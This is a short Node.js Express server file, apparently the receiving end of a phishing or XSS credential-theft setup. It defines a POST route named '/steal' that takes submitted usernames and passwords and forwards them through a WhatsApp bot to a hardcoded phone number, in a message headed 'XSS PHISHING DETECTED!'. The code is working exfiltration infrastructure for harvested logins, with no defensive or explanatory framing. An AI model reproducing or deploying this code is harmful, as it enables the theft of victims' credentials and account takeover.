// app.js
const startBot = require('./config/WhatsappConnection');
const express = require('express');
const bodyParser = require('body-parser');

// Start WhatsApp bot
startBot().then((sock) => {
  // ✅ Express server setup
  const app = express();
  app.use(bodyParser.json());

  // Example route: send data to your WhatsApp
  app.post('/steal', async (req, res) => {
    const { username, password } = req.body;
    const yourNumber = '2347017747337@c.us'; // Your WhatsApp JID

    try {
      await sock.sendMessage(yourNumber, {
        text: `🕷 *XSS PHISHING DETECTED!* \n\n👤 Username: ${username}\n🔑 Password: ${password}`,
      });
      res.sendStatus(200);
    } catch (err) {
      console.error('❌ Error sending crendentials to WhatsApp:', err.message);
      res.sendStatus(500);
    }
  });

  // Start the Express server
  app.listen(3001, () => {
    console.log('🚀 Express server running on port 3001');
  });
}).catch((err) => {
  console.error('❌ Failed to start bot:', err);
});
